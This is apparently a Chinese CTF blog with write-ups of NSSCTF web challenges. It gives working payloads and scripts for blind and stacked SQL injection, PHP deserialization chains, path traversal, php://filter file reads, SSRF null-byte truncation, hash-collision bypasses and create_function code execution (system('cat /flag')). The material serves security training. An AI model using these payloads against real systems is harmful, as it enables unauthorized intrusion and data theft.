，我们可以构造0^payload，若为payload结果真，则返回1，0^1=1，将得到查询id=1时的结果，回显Hello, glzjin wants a girlfriend。*/ 然后我们再用下面的脚本去爆破即可 1234567891011121314151617181920212223242526import requests import time url = &quot;http://node2.anna.nssctf.cn:28491/index.php&quot; payload = &#123; &quot;id&quot; : &quot;&quot; &#125; result = &quot;&quot; for i in range(1,100): l = 33 r =130 mid = (l+r)&gt;&gt;1 while(l&lt;r): payload[&quot;id&quot;] = &quot;0^&quot; + &quot;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;.format(i,mid) html = requests.post(url,data=payload) print(payload) if &quot;Hello&quot; in html.text: l = mid+1 else: r = mid mid = (l+r)&gt;&gt;1 if(chr(mid)==&quot; &quot;): break result = result + chr(mid) print(result) print(&quot;flag: &quot; ,result) 还有一个if方法的脚本也可以用来爆破（这个我试了感觉更快） 123456789101112131415161718192021222324252627import stringimport requestsres=&quot;&quot;url=&quot;http://node2.anna.nssctf.cn:28998/index.php&quot;for i in range(1,60): for j in string.printable: sql=&#x27;if(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))=&#123;1&#125;,1,2)&#x27;.format(i,ord(j)) post=&#123;&quot;id&quot;:sql&#125; result=requests.post(url=url,data=post) if &#x27;Hello&#x27; in result.text: res+=j print(res) else: continue NSSCTF{2365c1ca-eebc-4940-ad05-a397b1ca75a7} [NSSCTF 2022 Spring Recruit]babyphp123456789101112131415161718192021 &lt;?phphighlight_file(__FILE__);include_once(&#x27;flag.php&#x27;);if(isset($_POST[&#x27;a&#x27;])&amp;&amp;!preg_match(&#x27;/[0-9]/&#x27;,$_POST[&#x27;a&#x27;])&amp;&amp;intval($_POST[&#x27;a&#x27;]))&#123; if(isset($_POST[&#x27;b1&#x27;])&amp;&amp;$_POST[&#x27;b2&#x27;])&#123; if($_POST[&#x27;b1&#x27;]!=$_POST[&#x27;b2&#x27;]&amp;&amp;md5($_POST[&#x27;b1&#x27;])===md5($_POST[&#x27;b2&#x27;]))&#123; if($_POST[&#x27;c1&#x27;]!=$_POST[&#x27;c2&#x27;]&amp;&amp;is_string($_POST[&#x27;c1&#x27;])&amp;&amp;is_string($_POST[&#x27;c2&#x27;])&amp;&amp;md5($_POST[&#x27;c1&#x27;])==md5($_POST[&#x27;c2&#x27;]))&#123; echo $flag; &#125;else&#123; echo &quot;yee&quot;; &#125; &#125;else&#123; echo &quot;nop&quot;; &#125; &#125;else&#123; echo &quot;go on&quot;; &#125;&#125;else&#123; echo &quot;let&#x27;s get some php&quot;;&#125;?&gt; let&#x27;s get some php intval()函数 — 获取变量的整数值is_string() 函数用于检测变量是否是字符串 正则无数字绕过这里要求我们传5个参数，参数a的正则绕过可以用数组，preg_match只能处理字符串，当传入的参数是数组时会返回false，md5强比较也可以用数组绕过。 md5强比较和弱比较c1和c2要求必须是字符串类型，而且还有个md5的弱比较，则用md5加密之后为0e开头识别为科学计数法结果均为0绕过 12#payload：a[]=0&amp;b1[]=1&amp;b2[]=2&amp;c1=QNKCDZO&amp;c2=s878926199a [GDOUCTF 2023]EZ WEB首先点开没有什么信息，用dirsearch来扫描一波发现目录/src app.py内容如下 put传参12345678910111213141516 import flask app = flask.Flask(__name__) @app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;]) def index(): return flask.send_file(&#x27;index.html&#x27;) @app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;]) def source(): return flask.send_file(&#x27;app.py&#x27;) @app.route(&#x27;/super-secret-route-nobody-will-guess&#x27;, methods=[&#x27;PUT&#x27;]) def flag(): return open(&#x27;flag&#x27;).read() 这里主要考个put传参，抓包改一下就可以了 [GKCTF 2020]cve版签到 打开界面，点击链接，显示的是index.html文件上传之后的http响应头 抓包看到了提示 ssrf+%00截断 flag在本地而且必须要以123结尾 跳转之后的url框显示 1http://node4.anna.nssctf.cn:28342/?url=http://www.ctfhub.com这里去搜索这个cve漏洞 cve-2020-7066漏洞：PHP 7.2.29之前的7.2.x版本、 7.3.16之前的7.3.x版本、 7.4.4之前的7.4.x版本中的 ‘get_headers()’函数存在安全漏洞。可以⽤来绕WAF，SSRF利⽤。 get_headers() 返回⼀个数组，包含有服务器响应⼀个 HTTP 请求所发送的标头。 这个函数会截断00后的内容，所以读取到的url为http://localhost 这里用00截断去绕过 00截断 00截断包括%00截断和0x00截断 0x00是⼗六进制表示⽅法，是在ascii码中为0的字符，有些函数会将0x00当做结束符，从⽽进⾏⽂件上传的绕过 在url⾥⾯，get传⼊的%00会经过⼀次解码，解码为0x00,发挥截断作⽤。 所以最后的payload为 1?url=http://127.0.0.123%00www.ctfhub.com [HNCTF 2022 Week1]2048前端js命令执行在F12里，找到游戏结束之前的那一串alert，然后放到控制台执行一下 1alert(String.fromCharCode(24685,21916,33,102,108,97,103,123,53,51,49,54,48,99,56,56,56,101,50,53,99,51,102,56,50,56,98,50,51,101,51,49,54,97,55,97,101,48,56,51,125)); 即可得到flag [NISACTF 2022]popchains反序列化+php伪协议123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354Happy New Year~ MAKE A WISH &lt;?php echo &#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;; if(isset($_GET[&#x27;wish&#x27;]))&#123; @unserialize($_GET[&#x27;wish&#x27;]); &#125; else&#123; $a=new Road_is_Long; highlight_file(__FILE__); &#125; /***************************pop your 2022*****************************/ class Road_is_Long&#123; public $page; public $string; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;page = $file; &#125; public function __toString()&#123; return $this-&gt;string-&gt;page; &#125; public function __wakeup()&#123; if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\\.\\./i&quot;, $this-&gt;page)) &#123; echo &quot;You can Not Enter 2022&quot;; $this-&gt;page = &quot;index.php&quot;; &#125; &#125; &#125; class Try_Work_Hard&#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125; &#125; class Make_a_Change&#123; public $effort; public function __construct()&#123; $this-&gt;effort = array(); &#125; public function __get($key)&#123; $function = $this-&gt;effort; return $function(); &#125; &#125; /**********************Try to See flag.php*****************************/ 遇到反序列化的题，首先进行一下代码审计，利用的点应该是Try_Wirk_Hard类里的include()文件包含，之后就到了invoke()魔术方法，__invoke()当脚本尝试将对象调用为函数时触发之后我们看到Make_a_Change的类中的__get()方法，__get 魔术方法 是当访问一个类中的属性不存在或者private 的时候会被调用在 Road_is_Long类中，如下代码就会访问其page 属性，而其类中没有此方法，则会调用__get() 123public function __toString()&#123; return $this-&gt;string-&gt;page;&#125; __toString()，类被当成字符串时触发，那我们看到__wakeup()，如果$page 是一个对象，那么进入正则 $this-&gt;page 当做了字符串去匹配了。也就触发了 __toString 所以有下面的exp 12345678910111213141516171819202122 &lt;?php class Road_is_Long&#123; public $page; public $string; &#125; class Try_Work_Hard&#123; protected $var = &#x27;file:///flag&#x27;; //给var赋值，然后__invoke调用append，再赋值给value执行&#125; &#125; class Make_a_Change&#123; public $effort; &#125; $qw = new Road_is_Long(); //return一个对象，就相当于把page当作字符串，所以调用了__toString()$qw -&gt; page = $qw;//string来new了get所在的类，return $this-&gt;string-&gt;page，但是get所在的类里没有page属性，所以调用了get$qw -&gt; string = new Make_a_Change;//把effort用来new了一个对象，并且把对象return为函数形式，所以带你用了invoke，触发了include$qw -&gt; string -&gt; effort = new Try_Work_Hard;$wy = urlencode(serialize($qw));echo($wy); 1?wish=O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3Br%3A1%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A12%3A%22file%3A%2F%2F%2Fflag%22%3B%7D%7D%7D [HCTF 2018]Warmup访问source.php查看源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 第一段代码提示我们白名单有source.php和hint.php，所以我们也访问一下hint.php看看 1flag not here, and flag in ffffllllaaaagggg 提示了flag的文件名 正则绕过代码先判定了传⼊的是不是空或者是不是字符串，然后进⾏了三次⽩名单判断。in_array()函数如果search参数是字符串且type参数被设置为 TRUE，则搜索区分⼤⼩写。type 如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。如果没有在数组中找到参数，函数返回 falsemb_substr()函数 mb_strpos()函数mb_strpos()：返回要查找的字符串在别⼀个字符串中⾸次出现的位置。所以这里要求我们传入的参数file，要含有白名单里的字符串所以有 目录穿越123?file=hint.php?../../../../../../../../../../../ffffllllaaaagggg//或者?file=source.php?../../../../../../../../../../../ffffllllaaaagggg [HNCTF 2022 Week1]Interesting_include12345678910111213&lt;?php//WEB手要懂得搜索//flag in ./flag.phpif(isset($_GET[&#x27;filter&#x27;]))&#123; $file = $_GET[&#x27;filter&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $file))&#123; die(&quot;error&quot;); &#125; include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 这里匹配flag文件，如果没有匹配到flag，则会退出输出error filter伪协议 php://filter伪协议可以用于如下函数：include()file()file_get_contents()readfile()file_put_contents()可以用于读取、写入文件等函数， payload为： 1/?filter=php://filter/read=convert.base64-encode/resource=flag.php [SWPUCTF 2022 新生赛]ez_rce照常，扫一下扫出来蛮多路径的，访问一下/robots.txt然后得到路径/NSS/index.php/然后发现是thinkphp5这个版本，然后去网上搜下这个版本的rce漏洞搜到这篇文章","categories":[{"name":"CTF做题wp","slug":"CTF做题wp","permalink":"https://qingwan.top/categories/CTF%E5%81%9A%E9%A2%98wp/"}],"tags":[],"author":"Qingwan"},{"title":"NSSCTF刷题记录③--web","slug":"nss③","date":"2024-01-08T06:27:13.708Z","updated":"2024-01-08T06:33:45.161Z","comments":true,"path":"2024/01/08/nss③/","link":"","permalink":"https://qingwan.top/2024/01/08/nss%E2%91%A2/","excerpt":"比较基础的一些web题③","text":"比较基础的一些web题③ [强网杯 2019]随便注为SQL注入，测试如下 堆叠注入堆叠注入大概的意思就是用;连接起两个语句，然后让他们一起执行 1234567891011121 //正常回显1&#x27; //报错1&#x27; or 1=1 //报错1&#x27; or 1=1# //正常回显，则为字符型单引号注入，接下来判断字段数1&#x27; order by 2# //正常回显1&#x27; order by 3# //报错，字段数为21&#x27; union select 1,2# //判断回显位，然后回显了过滤的东西//return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); //查看数据库1&#x27;;show tables;# //查表1&#x27;; show columns from `1919810931114514`; # //查看字段信息！！注意在那个表的两边要打反引号//!!!!!!!!!!使用show 命令查看表中的「字段」，注意表名要用反引号包裹,尤其当表名为数字的时候 上面我们已经知道flag的文件了，但是过了滤了很多东西，我们要怎么获取这个flag呢接下来就有几种方法了，方法来自参考文章 alter语句alter修改表名 alter table 表名 rename 新表名;修改字段名 alter table 表名 change 旧字段名 新字段名 类型;通过题目观察 表单有两列, 也就是1 和 hahahah我们可以推测 这个表单其实是从表中以id字段为索引获取到内容 然后返回到前台并且后台的查询语句为”select * from words where id=&#39;.$_GET[&#39;inject&#39;].&#39;“ 那么 我们就可以通过修改带flag字段的表的名字为words表 然后把flag 字段修改为id通过三条alter语句来修改 修改words表名为table alter table words rename table; 修改1919810931114514表名为words &#96;alter table 1919810931114514 rename words; 修改新的words表中的flag列名为id alter table words change flag id ;得到最终payload 1&#39;; alter table words rename to words1;alter table 1919810931114514 rename to words;alter table words change flag id varchar(50);# 提交之后再输入1，发现没有结果了，那是因为原来的存放有id字段的words表已经变了我们可以通过让条件永真(输入万能密码），然后查出所有数据，进而获得flag1&#39; or 1=1# 预编译方式拼接关键字预编译相当于定一个语句相同，参数不通的Mysql模板，我们可以通过预编译的方式，绕过特定的字符过滤 格式： 123PREPARE 名称 FROM Sql语句 ? ;SET @x=xx;EXECUTE 名称 USING @x; 举例：查询ID为1的用户： 12345678910111213141516171819202122232425262728293031323334353637方法一：SElECT * FROM t_user WHERE USER_ID = 1方法二：PREPARE jia FROM &#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;EXECUTE jia;方法三：PREPARE jia FROM &#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;;SET @ID = 1;EXECUTE jia USING @ID;方法四：SET @SQL=&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;PREPARE jia FROM @SQL;EXECUTE jia;````因为select关键字被过滤了，所以我们可以通过预编译的方式拼接select 关键字：``1&#x27;;PREPARE hacker from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#``##### 十六进制编码我们可以直接将`` select * from `1919810931114514` ``语句进行16进制编码，即：`73656c656374202a2066726f6d20603139313938313039333131313435313460`，替换payload：`1&#x27;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#`同时，我们也可以先定义一个变量并将sql语句初始化，然后调用`1&#x27;;Set @jia = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @jia;EXECUTE hacker;#`##### handler方法- handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：```text打开表：HANDLER 表名 OPEN ;查看数据：HANDLER 表名 READ next;关闭表：HANDLER 表名 READ CLOSE; 1&#39;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE [NISACTF 2022]level-up打开环境，什么有用的都没有查看源代码显示： 1&lt;!-- here is level 1 --&gt; 用disearch扫一下扫出来个robots.txt，访问一下显示： 1Disallow: level_2_1s_h3re.php 访问一下：http:&#x2F;&#x2F;…&#x2F;level_2_1s_h3re.php得到level 2的源码 12345678910111213141516171819202122&lt;?php //here is level 2 error_reporting(0); include &quot;str.php&quot;; if (isset($_POST[&#x27;array1&#x27;]) &amp;&amp; isset($_POST[&#x27;array2&#x27;]))&#123; $a1 = (string)$_POST[&#x27;array1&#x27;]; $a2 = (string)$_POST[&#x27;array2&#x27;]; if ($a1 == $a2)&#123; die(&quot;????&quot;); &#125; if (md5($a1) === md5($a2))&#123; echo $level3; &#125; else&#123; die(&quot;level 2 failed ...&quot;); &#125; &#125; else&#123; show_source(__FILE__); &#125; ?&gt; md5强相等（Md5碰撞）(string类型)这里我们看到是要我们传入的参数md5之后的值相等，而且三个&#x3D;，为强比较类型强比较绕过一般可以用数组进行绕过： 1array1[]=1&amp;array2[]=1 但是发现不行，因为在定义$a1 和 $a2的时候，把array1和array2强制转换为了string类型，所以就不能利用数组进行绕过那就只能用md5强碰撞绕过 1array1=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%B0%90%968%96%85%2B%9BM%81g%81p%C9%BF4%00%1A%EC%3C%A5%22d%D46%86z%8A%CC%9F%9F%1D%87%19%FE%E2%CA%25%10%D5%E7%E9%DF%FB%9C%CF%00%A1%E96G%DC%F7%7F%2C%9Du%3CcfjtX-j%19%EA0%9BT%CF%F1%04%85WA%0E%F4%E3%EDu%D5%A3l6o%05%FAn%FB%B3KK%91%CFA0J%C1ir%07%9C%1F%9D%91%EB0l%BCb%FD%1DD%18n%AC%D2%CB%C6v%E3%C8W%CCd%15%C2&amp;array2=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%B0%90%968%96%85%2B%9BM%81g%81p%C9%BF4%00%1A%EC%BC%A5%22d%D46%86z%8A%CC%9F%9F%1D%87%19%FE%E2%CA%25%10%D5%E7%E9%DF%FB%9CO%01%A1%E96G%DC%F7%7F%2C%9Du%3Cc%E6jtX-j%19%EA0%9BT%CF%F1%04%85WA%0E%F4%E3%EDu%D5%A3%EC6o%05%FAn%FB%B3KK%91%CFA0J%C1ir%07%9C%1F%9D%91%EB0l%3Cb%FD%1DD%18n%AC%D2%CB%C6v%E3%C8%D7%CCd%15%C2 ！！！这里要注意要用burp来post传参，不然会被二次编码然后得到 1Level___3.php 源码为： 12345678910111213141516171819202122 &lt;?php //here is level 3 error_reporting(0); include &quot;str.php&quot;; if (isset($_POST[&#x27;array1&#x27;]) &amp;&amp; isset($_POST[&#x27;array2&#x27;]))&#123; $a1 = (string)$_POST[&#x27;array1&#x27;]; $a2 = (string)$_POST[&#x27;array2&#x27;]; if ($a1 == $a2)&#123; die(&quot;????&quot;); &#125; if (sha1($a1) === sha1($a2))&#123; echo $level4; &#125; else&#123; die(&quot;level 3 failed ...&quot;); &#125; &#125; else&#123; show_source(__FILE__); &#125; ?&gt; 这里就是sha1强碰撞了 sha1强碰撞这个和md5差不多，直接放payload 1array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 也记得要用Burp传噢然后回显 1level_level_4.php 访问 12345678910111213141516171819202122 &lt;?php //here is last level error_reporting(0); include &quot;str.php&quot;; show_source(__FILE__); $str = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]); if($str[&#x27;query&#x27;] == &quot;&quot;)&#123; echo &quot;give me a parameter&quot;; &#125; if(preg_match(&#x27;/ |_|20|5f|2e|\\./&#x27;,$str[&#x27;query&#x27;]))&#123; die(&quot;blacklist here&quot;); &#125; if($_GET[&#x27;NI_SA_&#x27;] === &quot;txw4ever&quot;)&#123; die($level5); &#125; else&#123; die(&quot;level 4 failed ...&quot;); &#125; ?&gt; give me a parameterlevel 4 failed ... 我们看到正则那里过滤了_，但是我们要传的参数名字中含有_，这里就要提到php的一个特性了 php特性：将_解析为空格php的变量解析绕过, php会把请求参数中的非法字符转为下划线，所以php会将空格解析成_所以payload为:(在urlencode中空格会被转换为+，所以我们直接写+) 1NI+SA+=txw4ever 回显：55_5_55.php 1234567891011121314&lt;?php //sorry , here is true last level //^_^ error_reporting(0); include &quot;str.php&quot;; $a = $_GET[&#x27;a&#x27;]; $b = $_GET[&#x27;b&#x27;]; if(preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$a))&#123; show_source(__FILE__); &#125; else&#123; $a(&#x27;&#x27;,$b); &#125; 这个正则表达式的意思是，参数a开头不能是字符数字和下划线最后的/i是不区分大小写，/s匹配任何不可见字符 &#x2F;D如果以$限制结尾字符，则不允许结尾有换行看到： 1$a(&#x27;&#x27;,$b); 这个网上搜了下相关绕过，发现了这个函数：特别看到$action(&#39;&#39;, $arg);就条件反射肯定是create_function() create_function()函数123create_function(string $args,string $code)//string $args 声明的函数变量部分//string $code 执行的方法代码部分 create_function()会创建一个匿名函数（lambda样式） create_function()函数会在内部执行 eval()，我们发现是执行了后面的return语句，属于create_function()中的第二个参数string $code位置。所以有： 123456789101112131415?a=\\create_function&amp;b=&#125;system(&#x27;cat /flag&#x27;);/*/*因为不能以那些开头，所以以\\转义符号开头然后$a写函数变量部分，为create_function()然后$b处写return语句，可写可不写；可以是：?a=\\create_function&amp;b=&#125;system(&#x27;cat /flag&#x27;);/*也可以是?a=\\create_function&amp;b=return &#x27;qw&#x27;;&#125;system(&#x27;cat /flag&#x27;);/*然后&#125;闭合else那里的&#123;后面加上执行命令的语句最后```/*将后面的函数注释从而进行任意代码执行漏洞然后就得到了最终的payload：?a=\\create_function&amp;b=&#125;system(&#x27;cat /flag&#x27;);/**/ NSSCTF{de8e94af-9e79-44ef-8d7d-12617a67d0ed} [鹏城杯 2022]简单包含1234 &lt;?php highlight_file(__FILE__); include($_POST[&quot;flag&quot;]); //flag in /var/www/html/flag.php; 直接试试伪协议： 12345flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php//发现有绕过，过滤了flagflag=php://filter/read=convert.base64-encode/resource=/var/www/html/f*//发现没有反应，那就先查看下源码flag=php://filter/read=convert.base64-encode/resource=index.php 发现一堆Base64的东西，那就解码，得到： 12345678910&lt;?php$path = $_POST[&quot;flag&quot;];if (strlen(file_get_contents(&#x27;php://input&#x27;)) &lt; 800 &amp;&amp; preg_match(&#x27;/flag/&#x27;, $path)) &#123; echo &#x27;nssctf waf!&#x27;;&#125; else &#123; @include($path);&#125;?&gt; 看到这里我们要使输入的字符数大于800，所以这里我们就输入一定数量的参数才行，所以有： 12a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php (这里(strlen(file_get_contents(‘php:&#x2F;&#x2F;input’)) &lt; 800 &amp;&amp; preg_match(‘&#x2F;flag&#x2F;‘, $path)我们要使这句话为false，这样才可以执行else里面的语句，因为我们输入的参数值大于了800，所以第一个为true，所以第二个要输入完整的路径，不能绕过flag，这样让他为false，true&amp;&amp;false&#x3D;false，就可以执行else里面的语句了)然后再把传参之后回显的值base64解码即可NSSCTF{835b7731-e7a2-4e6d-af6b-f7f1d7f713e4} [NISACTF 2022]babyupload打开是一个文件上传界面直接上传php文件不行，而且抓包改后缀也不可以查看源代码，发现了个 1&lt;!-- /source --&gt; 访问一下，下载得到了个app.py文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from flask import Flask, request, redirect, g, send_from_directory import sqlite3 import os import uuid app = Flask(__name__) SCHEMA = &quot;&quot;&quot;CREATE TABLE files ( id text primary key, path text ); &quot;&quot;&quot; def db(): g_db = getattr(g, &#x27;_database&#x27;, None) if g_db is None: g_db = g._database = sqlite3.connect(&quot;database.db&quot;) return g_db @app.before_first_request def setup(): os.remove(&quot;database.db&quot;) cur = db().cursor() cur.executescript(SCHEMA) @app.route(&#x27;/&#x27;) def hello_world(): return &quot;&quot;&quot;&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; Select image to upload: &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;&lt;/form&gt; &lt;!-- /source --&gt; &lt;/body&gt; &lt;/html&gt;&quot;&quot;&quot; @app.route(&#x27;/source&#x27;) def source(): return send_from_directory(directory=&quot;/var/www/html/&quot;, path=&quot;www.zip&quot;, as_attachment=True) @app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;]) def upload(): if &#x27;file&#x27; not in request.files: return redirect(&#x27;/&#x27;) file = request.files[&#x27;file&#x27;] if &quot;.&quot; in file.filename: return &quot;Bad filename!&quot;, 403 conn = db() cur = conn.cursor() uid = uuid.uuid4().hex try: cur.execute(&quot;insert into files (id, path) values (?, ?)&quot;, (uid, file.filename,)) except sqlite3.IntegrityError: return &quot;Duplicate file&quot; conn.commit() file.save(&#x27;uploads/&#x27; + file.filename) return redirect(&#x27;/file/&#x27; + uid) @app.route(&#x27;/file/&lt;id&gt;&#x27;) def file(id): conn = db() cur = conn.cursor() cur.execute(&quot;select path from files where id=?&quot;, (id,)) res = cur.fetchone() if res is None: return &quot;File not found&quot;, 404 # print(res[0]) with open(os.path.join(&quot;uploads/&quot;, res[0]), &quot;r&quot;) as f: return f.read() if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=80) 看到这段代码 123456789101112131415161718@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;]) def upload(): if &#x27;file&#x27; not in request.files: return redirect(&#x27;/&#x27;) file = request.files[&#x27;file&#x27;] if &quot;.&quot; in file.filename: return &quot;Bad filename!&quot;, 403 conn = db() cur = conn.cursor() uid = uuid.uuid4().hex try: cur.execute(&quot;insert into files (id, path) values (?, ?)&quot;, (uid, file.filename,)) except 